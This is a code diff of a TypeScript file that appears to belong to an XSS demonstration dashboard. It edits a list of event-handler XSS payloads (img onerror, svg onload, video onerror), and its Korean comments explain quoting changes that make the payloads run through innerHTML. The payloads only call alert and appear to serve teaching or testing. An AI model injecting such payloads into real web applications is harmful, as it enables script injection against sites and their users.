@@ -5,21 +5,23 @@ import type { DashboardConfig, WorkspaceMode } from '@/types';
 
 // <script> 태그는 innerHTML/dangerouslySetInnerHTML로 실행되지 않으므로
 // 이벤트 핸들러 기반 XSS 페이로드를 사용 (브라우저 보안 표준)
+// SVG는 XML/Foreign Content 파싱 → 이중 따옴표가 속성값을 깨뜨림
+// → 단일 따옴표 사용 또는 따옴표 없는 형태로 작성해야 innerHTML에서 정상 실행됨
 const XSS_PAYLOADS = [
   {
     label: 'img onerror',
-    payload: '<img src=x onerror=alert("XSS!")>',
+    payload: "<img src=x onerror=alert('XSS')>",
     desc: 'img 로드 실패 → onerror 핸들러 실행',
   },
   {
     label: 'svg onload',
-    payload: '<svg onload=alert("XSS!")>',
+    payload: "<svg onload=alert('XSS')>",
     desc: 'SVG 렌더링 시 onload 핸들러 실행',
   },
   {
-    label: 'body onload',
-    payload: '<body onload=alert("XSS!")>',
-    desc: 'body 태그 onload 이벤트 실행',
+    label: 'video onerror',
+    payload: "<video src onerror=alert('XSS')>",
+    desc: 'video 로드 실패 → onerror 핸들러 실행',
   },
 ];
 
